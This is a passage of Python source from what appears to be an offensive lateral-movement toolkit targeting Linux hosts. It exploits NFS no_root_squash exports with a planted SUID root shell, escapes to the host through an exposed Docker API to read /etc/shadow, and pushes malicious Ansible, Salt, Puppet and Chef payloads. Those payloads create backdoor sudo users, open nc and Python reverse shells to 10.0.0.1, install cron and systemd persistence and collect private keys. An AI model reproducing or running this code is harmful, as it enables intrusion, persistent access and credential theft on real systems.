                self.logger.warning("No exports with no_root_squash found, trying %s", vulnerable_export["path"])

            # Create temporary mount point
            mount_point = f"{tempfile.gettempdir()}/nfs_mount_{''.join(random.choices(string.ascii_lowercase, k=8))}"  # noqa: S311
            os.makedirs(mount_point, exist_ok=True)

            try:
                # Mount the NFS share
                mount_cmd = [
                    "mount",
                    "-t",
                    "nfs",
                    f"{target_ip}:{vulnerable_export['path']}",
                    mount_point,
                ]

                mount_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    mount_cmd, check=False, capture_output=True, text=True
                )

                if mount_result.returncode != 0:
                    return {
                        "success": False,
                        "error": f"Failed to mount NFS share: {mount_result.stderr}",
                        "target_ip": target_ip,
                        "export": vulnerable_export["path"],
                    }

                # Create SUID binary for privilege escalation
                if vulnerable_export["no_root_squash"]:
                    # Create a simple SUID shell
                    suid_source = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
"""
                    # Compile the SUID binary
                    with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                        f.write(suid_source)
                        source_path = f.name

                    binary_name = f"suid_shell_{random.randint(1000, 9999)}"  # noqa: S311
                    binary_path = os.path.join(mount_point, binary_name)

                    compile_cmd = ["gcc", "-o", binary_path, source_path]
                    compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        compile_cmd, check=False, capture_output=True, text=True
                    )

                    if compile_result.returncode == 0:
                        # Set SUID bit
                        # SUID exploitation requires 755 permissions to function properly in research context
                        os.chmod(binary_path, 0o4755)  # noqa: S103  # SUID bit + 755 required for privilege escalation research

                        # Create execution script
                        script_content = f"""#!/bin/bash
echo "To gain root on the target system:"
echo "1. Log into {target_ip}"
echo "2. Navigate to {vulnerable_export["path"]}"
echo "3. Execute: ./{binary_name}"
echo ""
echo "Testing local execution..."
{binary_path}
"""
                        script_path = f"{tempfile.gettempdir()}/nfs_exploit_{random.randint(1000, 9999)}.sh"  # noqa: S311
                        with open(script_path, "w") as f:
                            f.write(script_content)
                        os.chmod(script_path, 0o700)  # Owner-only executable script

                        os.unlink(source_path)

                        return {
                            "success": True,
                            "method": "nfs_no_root_squash",
                            "target_ip": target_ip,
                            "export": vulnerable_export["path"],
                            "mount_point": mount_point,
                            "suid_binary": binary_name,
                            "exploit_script": script_path,
                            "instructions": f"SUID shell created at {vulnerable_export['path']}/{binary_name}",
                        }
                    os.unlink(source_path)

                # Alternative: Deploy payload or backdoor
                if payload_path:
                    # Copy payload to NFS share
                    import shutil

                    payload_name = os.path.basename(payload_path)
                    dest_path = os.path.join(mount_point, payload_name)
                    shutil.copy2(payload_path, dest_path)
                    os.chmod(dest_path, 0o700)  # Owner-only executable payload

                    return {
                        "success": True,
                        "method": "nfs_payload_deployment",
                        "target_ip": target_ip,
                        "export": vulnerable_export["path"],
                        "mount_point": mount_point,
                        "payload_deployed": payload_name,
                    }
                # Just return mount information
                return {
                    "success": True,
                    "method": "nfs_mount_only",
                    "target_ip": target_ip,
                    "export": vulnerable_export["path"],
                    "mount_point": mount_point,
                    "writable": os.access(mount_point, os.W_OK),
                }

            finally:
                # Always try to unmount
                subprocess.run(["umount", mount_point], check=False, capture_output=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603, S607
                try:
                    os.rmdir(mount_point)
                except (OSError, FileNotFoundError, PermissionError) as e:
                    logger.debug(f"Failed to remove mount point: {e}")

        except Exception as e:
            self.logger.error("NFS mount lateral movement failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_docker_api(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Exploit exposed Docker API for container escape and privilege escalation."""
        self.logger.info("Attempting Docker API exploitation on %s", target_ip)

        try:
            import http.client
            import json

            import requests

            # Docker API ports
            docker_ports = [2375, 2376]  # HTTP and HTTPS
            docker_socket = credentials.get("docker_socket", "/var/run/docker.sock")

            # Check if we have local socket access
            if target_ip == "localhost" or target_ip == "127.0.0.1":
                # Local Docker socket exploitation
                import socket

                if os.path.exists(docker_socket):
                    # Use Unix socket
                    class UnixHTTPConnection(http.client.HTTPConnection):
                        def __init__(self, path):
                            """Initialize Unix HTTP connection with socket path."""
                            super().__init__("localhost")
                            self.path = path

                        def connect(self):
                            self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                            self.sock.connect(self.path)

                    # Test Docker API via socket
                    conn = UnixHTTPConnection(docker_socket)
                    conn.request("GET", "/version")
                    response = conn.getresponse()

                    if response.status == 200:
                        version_info = json.loads(response.read().decode())

                        # Create privileged container for escape
                        container_config = {
                            "Image": "alpine:latest",
                            "Cmd": ["/bin/sh"],
                            "DetachKeys": "ctrl-p,ctrl-q",
                            "OpenStdin": True,
                            "Tty": True,
                            "HostConfig": {
                                "Privileged": True,
                                "Binds": ["/:/hostfs"],
                                "NetworkMode": "host",
                                "PidMode": "host",
                                "IpcMode": "host",
                                "UTSMode": "host",
                                "UsernsMode": "host",
                                "CapAdd": ["ALL"],
                                "SecurityOpt": ["apparmor:unconfined", "seccomp:unconfined"],
                            },
                        }

                        # Create container
                        conn.request(
                            "POST",
                            "/containers/create",
                            body=json.dumps(container_config),
                            headers={"Content-Type": "application/json"},
                        )
                        create_resp = conn.getresponse()

                        if create_resp.status == 201:
                            container_info = json.loads(create_resp.read().decode())
                            container_id = container_info["Id"]

                            # Start container
                            conn.request("POST", f"/containers/{container_id}/start")
                            start_resp = conn.getresponse()

                            if start_resp.status == 204:
                                # Execute command in container
                                exec_config = {
                                    "Cmd": [
                                        "chroot",
                                        "/hostfs",
                                        "/bin/bash",
                                        "-c",
                                        payload_path if payload_path else "id; hostname; cat /etc/shadow | head -5",
                                    ],
                                    "AttachStdout": True,
                                    "AttachStderr": True,
                                }

                                conn.request(
                                    "POST",
                                    f"/containers/{container_id}/exec",
                                    body=json.dumps(exec_config),
                                    headers={"Content-Type": "application/json"},
                                )
                                exec_resp = conn.getresponse()

                                if exec_resp.status == 201:
                                    exec_info = json.loads(exec_resp.read().decode())
                                    exec_id = exec_info["Id"]

                                    # Start exec
                                    conn.request(
                                        "POST",
                                        f"/exec/{exec_id}/start",
                                        body=json.dumps({"Detach": False, "Tty": False}),
                                        headers={"Content-Type": "application/json"},
                                    )
                                    output_resp = conn.getresponse()
                                    output = output_resp.read().decode()

                                    # Cleanup - remove container
                                    conn.request("DELETE", f"/containers/{container_id}?force=true")

                                    return {
                                        "success": True,
                                        "method": "docker_socket_privileged_container",
                                        "target_ip": target_ip,
                                        "docker_version": version_info.get("Version"),
                                        "container_id": container_id[:12],
                                        "execution_output": output,
                                        "root_access": True,
                                    }

            # Remote Docker API exploitation
            for port in docker_ports:
                try:
                    # Test connection
                    base_url = f"http://{target_ip}:{port}"
                    version_resp = requests.get(f"{base_url}/version", timeout=5)

                    if version_resp.status_code == 200:
                        version_info = version_resp.json()

                        # Pull alpine image if not exists
                        requests.post(f"{base_url}/images/create?fromImage=alpine&tag=latest", timeout=30)

                        # Create malicious container
                        container_config = {
                            "Image": "alpine",
                            "Cmd": ["/bin/sh", "-c", "while true; do sleep 30; done"],
                            "HostConfig": {
                                "Privileged": True,
                                "Binds": ["/:/hostroot"],
                                "NetworkMode": "host",
                                "PidMode": "host",
                                "CapAdd": ["ALL"],
                            },
                        }

                        create_resp = requests.post(f"{base_url}/containers/create", json=container_config, timeout=30)

                        if create_resp.status_code == 201:
                            container_id = create_resp.json()["Id"]

                            # Start container
                            requests.post(f"{base_url}/containers/{container_id}/start", timeout=30)

                            # Execute root command
                            exec_cmd = {
                                "Cmd": [
                                    "chroot",
                                    "/hostroot",
                                    "bash",
                                    "-c",
                                    payload_path
                                    if payload_path
                                    else "echo 'Docker API exploited' > /tmp/docker_pwn.txt; id; cat /etc/shadow | head -3",
                                ],
                                "AttachStdout": True,
                                "AttachStderr": True,
                            }

                            exec_resp = requests.post(f"{base_url}/containers/{container_id}/exec", json=exec_cmd, timeout=30)

                            if exec_resp.status_code == 201:
                                exec_id = exec_resp.json()["Id"]

                                # Run exec
                                start_resp = requests.post(
                                    f"{base_url}/exec/{exec_id}/start",
                                    headers={"Content-Type": "application/vnd.docker.raw-stream"},
                                    json={"Detach": False},
                                    timeout=30,
                                )

                                # Clean up
                                requests.delete(f"{base_url}/containers/{container_id}?force=true", timeout=30)

                                return {
                                    "success": True,
                                    "method": "docker_api_remote_exploitation",
                                    "target_ip": target_ip,
                                    "port": port,
                                    "docker_version": version_info.get("Version"),
                                    "container_id": container_id[:12],
                                    "root_access": True,
                                    "output": start_resp.text if start_resp.status_code == 200 else "Execution completed",
                                }

                except requests.exceptions.RequestException:
                    continue

            return {
                "success": False,
                "error": "Docker API not accessible on standard ports",
                "target_ip": target_ip,
                "ports_tried": docker_ports,
            }

        except Exception as e:
            self.logger.error("Docker API exploitation failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_ansible(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute commands on remote Linux systems via Ansible."""
        self.logger.info("Executing Ansible lateral movement to %s", target_ip)

        try:
            import subprocess
            import tempfile

            import yaml

            username = credentials.get("username", "root")
            password = credentials.get("password")
            ssh_key = credentials.get("ssh_key")
            ansible_vault_pass = credentials.get("vault_password")

            # Create temporary inventory file
            with tempfile.NamedTemporaryFile(mode="w", suffix=".ini", delete=False) as inv_file:
                inventory_path = inv_file.name
                inv_file.write("[targets]\n")
                inv_file.write(f"{target_ip} ansible_user={username}")

                if password:
                    inv_file.write(f" ansible_password={password}")
                if ssh_key:
                    inv_file.write(f" ansible_ssh_private_key_file={ssh_key}")

                inv_file.write("\n")
                inv_file.write("[targets:vars]\n")
                inv_file.write("ansible_python_interpreter=/usr/bin/python3\n")
                inv_file.write("ansible_ssh_common_args='-o StrictHostKeyChecking=no'\n")

            # Create playbook for execution
            with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as playbook_file:
                playbook_path = playbook_file.name

                if payload_path and os.path.exists(payload_path):
                    # Use provided playbook
                    with open(payload_path) as f:
                        playbook_content = f.read()
                    playbook_file.write(playbook_content)
                else:
                    # Create default exploitation playbook
                    playbook = [
                        {
                            "name": "Lateral Movement Playbook",
                            "hosts": "targets",
                            "gather_facts": True,
                            "become": True,
                            "tasks": [
                                {
                                    "name": "Create backdoor user",
                                    "user": {
                                        "name": "svc_ansible",
                                        "uid": "1337",
                                        "groups": "sudo",
                                        "shell": "/bin/bash",
                                        "password": "$6$rounds=656000$MlPYh3Lf$HGFw9o8yNKw0CkTtKaXJ8cT.u5z1gLPyfV/5c3qKpH1",  # ansible123
                                    },
                                    "ignore_errors": True,
                                },
                                {
                                    "name": "Add SSH key for persistence",
                                    "authorized_key": {
                                        "user": "svc_ansible",
                                        "key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... ansible@lateral",
                                        "state": "present",
                                    },
                                    "ignore_errors": True,
                                },
                                {
                                    "name": "Deploy reverse shell",
                                    "copy": {
                                        "dest": "/tmp/.ansible_helper",  # noqa: S108
                                        "mode": "0755",
                                        "content": "#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444 &",
                                    },
                                },
                                {
                                    "name": "Execute reverse shell",
                                    "shell": "nohup /tmp/.ansible_helper &",
                                    "async": 300,
                                    "poll": 0,
                                },
                                {
                                    "name": "Install persistence via cron",
                                    "cron": {
                                        "name": "ansible_callback",
                                        "minute": "*/15",
                                        "job": "/tmp/.ansible_helper",  # noqa: S108
                                        "user": "root",
                                    },
                                },
                                {
                                    "name": "Gather sensitive data",
                                    "shell": 'find /home -name "*.pem" -o -name "*.key" -o -name "id_rsa*" 2>/dev/null',
                                    "register": "sensitive_files",
                                },
                                {
                                    "name": "Exfiltrate data",
                                    "fetch": {
                                        "src": "{{ item }}",
                                        "dest": "/tmp/ansible_exfil/",  # noqa: S108
                                        "flat": False,
                                    },
                                    "with_items": "{{ sensitive_files.stdout_lines }}",
                                    "ignore_errors": True,
                                },
                            ],
                        }
                    ]

                    yaml.dump(playbook, playbook_file, default_flow_style=False)

            # Execute playbook
            cmd = [
                "ansible-playbook",
                "-i",
                inventory_path,
                playbook_path,
                "-v",
            ]

            if ansible_vault_pass:
                vault_file = tempfile.NamedTemporaryFile(mode="w", delete=False)
                vault_file.write(ansible_vault_pass)
                vault_file.close()
                cmd.extend(["--vault-password-file", vault_file.name])

            # Run ansible-playbook
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                cmd,
                check=False,
                capture_output=True,
                text=True,
                timeout=300,
            )

            # Parse results
            success = result.returncode == 0

            if success:
                # Extract execution details from output
                output_lines = result.stdout.split("\n")
                tasks_completed = []

                for line in output_lines:
                    if "TASK [" in line:
                        task_name = line.split("[")[1].split("]")[0]
                        tasks_completed.append(task_name)

                return {
                    "success": True,
                    "method": "ansible",
                    "target_ip": target_ip,
                    "tasks_completed": tasks_completed,
                    "playbook": playbook_path,
                    "output": result.stdout[-1000:],  # Last 1000 chars
                }
            return {
                "success": False,
                "error": f"Ansible execution failed: {result.stderr}",
                "target_ip": target_ip,
                "output": result.stdout,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Ansible playbook execution timed out",
                "target_ip": target_ip,
            }
        except Exception as e:
            self.logger.error("Ansible lateral movement failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }
        finally:
            # Cleanup temp files
            try:
                if "inventory_path" in locals():
                    os.unlink(inventory_path)
                if "playbook_path" in locals():
                    os.unlink(playbook_path)
                if "vault_file" in locals():
                    os.unlink(vault_file.name)
            except (FileNotFoundError, OSError, PermissionError, NameError) as e:
                logger.debug(f"Failed to clean up vault file: {e}")

    def _linux_salt_stack(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute commands on remote Linux systems via Salt Stack."""
        self.logger.info("Executing Salt Stack lateral movement to %s", target_ip)

        try:
            import subprocess
            import tempfile

            import yaml

            salt_master = credentials.get("salt_master", "localhost")
            salt_api_url = credentials.get("salt_api_url", f"https://{salt_master}:8000")
            salt_user = credentials.get("salt_user", "saltapi")
            salt_pass = credentials.get("salt_pass")
            salt_token = credentials.get("salt_token")
            minion_id = credentials.get("minion_id", target_ip)

            # Method 1: Using salt command directly (if on master)
            if salt_master == "localhost":
                # Create state file for exploitation
                with tempfile.NamedTemporaryFile(mode="w", suffix=".sls", delete=False) as state_file:
                    state_path = state_file.name

                    if payload_path and os.path.exists(payload_path):
                        with open(payload_path) as f:
                            state_content = f.read()
                        state_file.write(state_content)
                    else:
                        # Default exploitation state
                        state = {
                            "create_backdoor_user": {
                                "user.present": [
                                    {"name": "salt_backdoor"},
                                    {"uid": 1338},
                                    {"gid": 1338},
                                    {"shell": "/bin/bash"},
                                    {"home": "/var/tmp/.salt"},  # noqa: S108
                                    {"password": "$6$SALTsalt$KqPR3BfVT.dlmHJ4SfKpBa0N1Cp2eJkKNP5LmT9"},
                                ],
                            },
                            "add_ssh_key": {
                                "ssh_auth.present": [
                                    {"user": "salt_backdoor"},
                                    {"name": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... salt@lateral"},
                                ],
                            },
                            "deploy_persistence": {
                                "file.managed": [
                                    {"name": "/var/tmp/.salt_helper"},  # noqa: S108
                                    {"mode": 755},
                                    {"contents": "#!/bin/bash\\nnc -e /bin/sh 10.0.0.1 4445 &"},
                                ],
                            },
                            "install_cron_persistence": {
                                "cron.present": [
                                    {"name": "salt_callback"},
                                    {"user": "root"},
                                    {"minute": "*/20"},
                                    {"cmd": "/var/tmp/.salt_helper"},  # noqa: S108
                                ],
                            },
                            "execute_payload": {
                                "cmd.run": [
                                    {"name": "nohup /var/tmp/.salt_helper &"},
                                    {"bg": True},
                                ],
                            },
                        }
                        yaml.dump(state, state_file, default_flow_style=False)

                # Apply state to target minion
                cmd = [
                    "salt",
                    minion_id,
                    "state.apply",
                    state_path.replace(".sls", "").split("/")[-1],
                    "saltenv=base",
                ]

                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    cmd, check=False, capture_output=True, text=True, shell=False, timeout=120
                )

                if result.returncode == 0:
                    return {
                        "success": True,
                        "method": "salt_stack_cli",
                        "target_ip": target_ip,
                        "minion_id": minion_id,
                        "output": result.stdout,
                    }

            # Method 2: Using Salt API
            if salt_api_url and (salt_token or (salt_user and salt_pass)):
                import json

                # Authenticate if needed
                if not salt_token:
                    auth_data = {
                        "username": salt_user,
                        "password": salt_pass,
                        "eauth": "pam",
                    }
                    auth_resp = secure_post(
                        f"{salt_api_url}/login",
                        data=auth_data,
                        verify=False,
                    )
                    if auth_resp.status_code == 200:
                        salt_token = auth_resp.json()["return"][0]["token"]

                headers = {
                    "X-Auth-Token": salt_token,
                    "Content-Type": "application/json",
                }

                # Execute commands via API
                api_data = {
                    "client": "local",
                    "tgt": minion_id,
                    "fun": "cmd.run",
                    "arg": [
                        'useradd -m -s /bin/bash -u 1338 salt_api && echo "salt_api:Salt123!" | chpasswd',
                    ],
                }

                response = secure_post(
                    salt_api_url,
                    headers=headers,
                    data=json.dumps(api_data),
                    verify=False,
                )

                if response.status_code == 200:
                    # Execute additional persistence commands
                    persistence_cmds = [
                        'mkdir -p /var/tmp/.salt && echo "nc -e /bin/sh 10.0.0.1 4445" > /var/tmp/.salt/cb.sh',
                        "chmod +x /var/tmp/.salt/cb.sh",
                        '(crontab -l 2>/dev/null; echo "*/20 * * * * /var/tmp/.salt/cb.sh") | crontab -',
                        "nohup /var/tmp/.salt/cb.sh > /dev/null 2>&1 &",
                    ]

                    for cmd in persistence_cmds:
                        api_data["arg"] = [cmd]
                        secure_post(
                            salt_api_url,
                            headers=headers,
                            data=json.dumps(api_data),
                            verify=False,
                        )

                    return {
                        "success": True,
                        "method": "salt_stack_api",
                        "target_ip": target_ip,
                        "minion_id": minion_id,
                        "api_url": salt_api_url,
                    }

            return {
                "success": False,
                "error": "Salt Stack execution failed - no valid method available",
                "target_ip": target_ip,
            }

        except Exception as e:
            self.logger.error("Salt Stack lateral movement failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_puppet(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute commands on remote Linux systems via Puppet."""
        self.logger.info("Executing Puppet lateral movement to %s", target_ip)

        try:
            import os
            import subprocess
            import tempfile

            puppet_master = credentials.get("puppet_master", "localhost")
            puppet_cert = credentials.get("puppet_cert")
            puppet_key = credentials.get("puppet_key")
            puppet_ca = credentials.get("puppet_ca")
            node_name = credentials.get("node_name", target_ip)

            # Method 1: Direct puppet command execution on master
            if puppet_master == "localhost":
                # Create malicious manifest
                with tempfile.NamedTemporaryFile(mode="w", suffix=".pp", delete=False) as manifest_file:
                    manifest_path = manifest_file.name

                    if payload_path and os.path.exists(payload_path):
                        with open(payload_path) as f:
                            manifest_content = f.read()
                        manifest_file.write(manifest_content)
                    else:
                        # Default exploitation manifest
                        manifest = (
                            """
# Puppet lateral movement manifest
node '"""
                            + node_name
                            + """' {
  # Create backdoor user
  user { 'puppet_backdoor':
    ensure     => present,
    uid        => '1339',
    gid        => '1339',
    shell      => '/bin/bash',
    home       => '/var/tmp/.puppet',
    managehome => true,
    password   => '$6$PUPPETsalt$7mJwM5r5XqBp0W8M8l0vL9RH0R8TpQp',
  }

  # Add sudo privileges
  file { '/etc/sudoers.d/puppet_backdoor':
    ensure  => present,
    content => 'puppet_backdoor ALL=(ALL) NOPASSWD: ALL',
    mode    => '0440',
  }

  # Deploy persistence script
  file { '/var/tmp/.puppet/helper.sh':
    ensure  => present,
    content => '#!/bin/bash\nwhile true; do nc -e /bin/sh 10.0.0.1 4446 2>/dev/null; sleep 300; done',
    mode    => '0755',
    owner   => 'puppet_backdoor',
    require => User['puppet_backdoor'],
  }

  # Create systemd service for persistence
  file { '/etc/systemd/system/puppet-helper.service':
    ensure  => present,
    content => '[Unit]
Description=Puppet Helper Service
After=network.target

[Service]
Type=simple
User=puppet_backdoor
ExecStart=/var/tmp/.puppet/helper.sh
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target',
  }

  # Enable and start service
  service { 'puppet-helper':
    ensure  => running,
    enable  => true,
    require => File['/etc/systemd/system/puppet-helper.service'],
  }

  # Execute immediate payload
  exec { 'puppet_payload':
    command => '/var/tmp/.puppet/helper.sh &',
    path    => ['/bin', '/usr/bin'],
    user    => 'puppet_backdoor',
    require => File['/var/tmp/.puppet/helper.sh'],
  }

  # Collect sensitive data
  exec { 'collect_data':
    command => 'find /home /root -name "*.pem" -o -name "*.key" -o -name "id_rsa*" 2>/dev/null | tar czf /tmp/puppet_exfil.tar.gz -T -',
    path    => ['/bin', '/usr/bin'],
    creates => '/tmp/puppet_exfil.tar.gz',
  }
}
"""
                        )
                        manifest_file.write(manifest)

                # Apply manifest to specific node
                cmd = [
                    "puppet",
                    "apply",
                    "--node",
                    node_name,
                    manifest_path,
                ]

                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    cmd, check=False, capture_output=True, text=True, shell=False, timeout=180
                )

                if result.returncode == 0:
                    return {
                        "success": True,
                        "method": "puppet_apply",
                        "target_ip": target_ip,
                        "node_name": node_name,
                        "manifest": manifest_path,
                        "output": result.stdout,
                    }

            # Method 2: Puppet bolt for agentless execution
            try:
                # Check if bolt is available
                bolt_check = subprocess.run(["bolt", "--version"], check=False, capture_output=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
                if bolt_check.returncode == 0:
                    # Create bolt inventory
                    inventory = {
                        "nodes": [
                            {
                                "uri": f"{node_name}",
                                "config": {
                                    "transport": "ssh",
                                    "ssh": {
                                        "user": credentials.get("ssh_user", "root"),
                                        "password": credentials.get("ssh_password"),
                                        "host-key-check": False,
                                    },
                                },
                            }
                        ],
                    }

                    with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as inv_file:
                        import yaml

                        yaml.dump(inventory, inv_file)
                        inv_path = inv_file.name

                    # Execute command via bolt
                    bolt_cmd = [
                        "bolt",
                        "command",
                        "run",
                        'useradd -m -u 1339 puppet_bolt && echo "#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4446" > /tmp/.bolt && chmod +x /tmp/.bolt && nohup /tmp/.bolt &',
                        "--nodes",
                        node_name,
                        "--inventoryfile",
                        inv_path,
                        "--no-host-key-check",
                    ]

                    bolt_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        bolt_cmd, check=False, capture_output=True, text=True, shell=False, timeout=60
                    )

                    if bolt_result.returncode == 0:
                        return {
                            "success": True,
                            "method": "puppet_bolt",
                            "target_ip": target_ip,
                            "node_name": node_name,
                            "output": bolt_result.stdout,
                        }
            except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError) as e:
                logger.debug(f"Failed to execute automation command: {e}")

            # Method 3: Puppet REST API
            if puppet_cert and puppet_key:
                import requests

                puppet_api_url = f"https://{puppet_master}:8140"

                # Create malicious catalog
                catalog = {
                    "resources": [
                        {
                            "type": "Exec",
                            "title": "backdoor",
                            "parameters": {
                                "command": 'useradd -m puppet_api && echo "puppet_api:Puppet123!" | chpasswd',
                                "path": ["/bin", "/usr/bin"],
                            },
                        }
                    ],
                }

                response = requests.post(
                    f"{puppet_api_url}/puppet/v3/catalog/{node_name}",
                    json=catalog,
                    cert=(puppet_cert, puppet_key),
                    verify=puppet_ca if puppet_ca else False,
                    timeout=30,
                )

                if response.status_code == 200:
                    return {
                        "success": True,
                        "method": "puppet_api",
                        "target_ip": target_ip,
                        "node_name": node_name,
                        "api_url": puppet_api_url,
                    }

            return {
                "success": False,
                "error": "Puppet execution failed - no valid method available",
                "target_ip": target_ip,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Puppet execution timed out",
                "target_ip": target_ip,
            }
        except Exception as e:
            self.logger.error("Puppet lateral movement failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_chef(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute commands on remote Linux systems via Chef."""
        self.logger.info("Executing Chef lateral movement to %s", target_ip)

        try:
            import os
            import subprocess
            import tempfile

            chef_server = credentials.get("chef_server", "localhost")
            chef_client_key = credentials.get("chef_client_key")
            chef_validation_key = credentials.get("chef_validation_key")
            chef_node_name = credentials.get("node_name", target_ip)
            chef_org = credentials.get("chef_org", "default")

            # Method 1: Using knife command
            if chef_server == "localhost" or chef_client_key:
                # Create malicious cookbook
                cookbook_dir = tempfile.mkdtemp(prefix="chef_lateral_")
                cookbook_name = "lateral_movement"

                # Create cookbook structure
                os.makedirs(f"{cookbook_dir}/{cookbook_name}/recipes")
                os.makedirs(f"{cookbook_dir}/{cookbook_name}/files/default")

                # Create metadata.rb
                with open(f"{cookbook_dir}/{cookbook_name}/metadata.rb", "w") as f:
                    f.write(f"""
name '{cookbook_name}'
maintainer 'Lateral Movement'
version '0.1.0'
chef_version '>= 12.0'
""")

                # Create malicious recipe
                with open(f"{cookbook_dir}/{cookbook_name}/recipes/default.rb", "w") as f:
                    if payload_path and os.path.exists(payload_path):
                        with open(payload_path) as p:
                            recipe_content = p.read()
                        f.write(recipe_content)
                    else:
                        f.write("""
# Chef lateral movement recipe

# Create backdoor user
user 'chef_backdoor' do
  uid 1340
  gid 1340
  home '/var/tmp/.chef'
  shell '/bin/bash'
  password '$6$CHEFsalt$8nJwM5r5XqBp0W8M8l0vL9RH0R8TpQp'
  manage_home true
end

# Add sudo privileges
file '/etc/sudoers.d/chef_backdoor' do
  content 'chef_backdoor ALL=(ALL) NOPASSWD: ALL'
  mode '0440'
end

# Deploy persistence script
file '/var/tmp/.chef/callback.sh' do
  content '#!/bin/bash\\nwhile true; do nc -e /bin/sh 10.0.0.1 4447 2>/dev/null || python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\'10.0.0.1\\',4447));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/sh\\',\\'-i\\'])\"; sleep 300; done'
  mode '0755'
  owner 'chef_backdoor'
end

# Create systemd persistence
systemd_unit 'chef-callback.service' do
  content <<-EOU
  [Unit]
  Description=Chef Callback Service
  After=network.target

  [Service]
  Type=simple
  User=chef_backdoor
  ExecStart=/var/tmp/.chef/callback.sh
  Restart=always
  RestartSec=300

  [Install]
  WantedBy=multi-user.target
  EOU
  action [:create, :enable, :start]
end

# Alternative cron persistence
cron 'chef_persistence' do
  minute '*/15'
  user 'chef_backdoor'
  command '/var/tmp/.chef/callback.sh'
end

# Execute immediate payload
execute 'trigger_callback' do
  command 'nohup /var/tmp/.chef/callback.sh > /dev/null 2>&1 &'
  user 'chef_backdoor'
  not_if 'pgrep -f callback.sh'
end

# Gather sensitive data
execute 'collect_secrets' do
  command 'find /etc /home /root -name "*.pem" -o -name "*.key" -o -name "*_rsa*" -o -name "*.p12" 2>/dev/null | head -50 | xargs tar czf /tmp/chef_exfil.tar.gz 2>/dev/null || true'
  creates '/tmp/chef_exfil.tar.gz'
end

# Download exfiltrated data
remote_file '/var/tmp/.chef/exfil.tar.gz' do
  source 'file:///tmp/chef_exfil.tar.gz'
  owner 'chef_backdoor'
  mode '0600'
  action :create
  ignore_failure true
end
""")

                # Upload cookbook
                upload_cmd = [
                    "knife",
                    "cookbook",
                    "upload",
                    cookbook_name,
                    "--cookbook-path",
                    cookbook_dir,
                    "-c",
                    credentials.get("knife_config", "~/.chef/knife.rb"),
                ]

                if chef_client_key:
                    upload_cmd.extend(["--key", chef_client_key])
                elif chef_validation_key:
                    # Use validation key for node bootstrap and upload
                    upload_cmd.extend(["--key", chef_validation_key])
                    # Create knife config for validation key
                    knife_config_path = f"{cookbook_dir}/knife_validation.rb"
                    with open(knife_config_path, "w") as f:
                        f.write(f"""
current_dir = File.dirname(__FILE__)
log_level                :info
log_location             STDOUT
node_name                "{chef_org}-validator"
client_key               "{chef_validation_key}"
chef_server_url          "https://{chef_server}/organizations/{chef_org}"
cookbook_path            ["{cookbook_dir}"]
""")
                    upload_cmd[upload_cmd.index("-c") + 1] = knife_config_path

                upload_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    upload_cmd, check=False, capture_output=True, text=True, shell=False, timeout=60
                )

                if upload_result.returncode == 0:
                    # Add cookbook to node's run list
                    run_list_cmd = [
                        "knife",
                        "node",
                        "run_list",
                        "add",
                        chef_node_name,
                        f"recipe[{cookbook_name}]",
                        "-c",
                        credentials.get("knife_config", "~/.chef/knife.rb"),
                    ]

                    if chef_client_key:
                        run_list_cmd.extend(["--key", chef_client_key])
                    elif chef_validation_key:
                        run_list_cmd.extend(["--key", chef_validation_key])
                        run_list_cmd[run_list_cmd.index("-c") + 1] = knife_config_path

                    secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        run_list_cmd, check=False, capture_output=True, text=True, shell=False, timeout=30
                    )

                    # Trigger chef-client run on node
                    ssh_path = shutil.which("ssh")
                    if ssh_path:
                        trigger_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [ssh_path, chef_node_name, "sudo chef-client"],
                            check=False,
                            capture_output=True,
                            text=True,
                            timeout=180,
